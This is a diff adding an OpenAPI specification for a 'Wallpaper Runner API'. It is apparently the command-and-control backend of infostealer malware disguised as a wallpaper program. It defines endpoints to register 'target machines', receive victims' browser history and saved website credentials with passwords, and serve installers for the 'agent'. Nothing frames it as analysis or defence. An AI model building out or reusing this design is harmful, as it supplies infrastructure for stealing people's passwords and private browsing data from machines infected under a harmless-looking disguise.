@@ -1,0 +1,99 @@
+openapi: 3.0.3
+info:
+  title: Wallpaper Runner API
+  version: 1.0.0
+  description: API for managing target agents and collecting data.
+
+paths:
+  /register:
+    post:
+      summary: Register a new target machine
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                machine_id:
+                  type: string
+                hostname:
+                  type: string
+                ip_address:
+                  type: string
+                os_info:
+                  type: string
+      responses:
+        '200':
+          description: Registration successful
+
+  /submit/history:
+    post:
+      summary: Submit browser history from target
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                machine_id:
+                  type: string
+                history:
+                  type: array
+                  items:
+                    type: object
+                    properties:
+                      url:
+                        type: string
+                      title:
+                        type: string
+                      visit_time:
+                        type: string
+                        format: date-time
+                      browser_type:
+                        type: string
+      responses:
+        '200':
+          description: History received
+
+  /submit/credentials:
+    post:
+      summary: Submit credentials from target
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                machine_id:
+                  type: string
+                credentials:
+                  type: array
+                  items:
+                    type: object
+                    properties:
+                      website:
+                        type: string
+                      username:
+                        type: string
+                      password:
+                        type: string
+                      browser_type:
+                        type: string
+      responses:
+        '200':
+          description: Credentials received
+
+  /download/agent:
+    get:
+      summary: Serve download page for agent installers
+      responses:
+        '200':
+          description: HTML page with OS download options
+          content:
+            text/html:
+              schema:
+                type: string
+
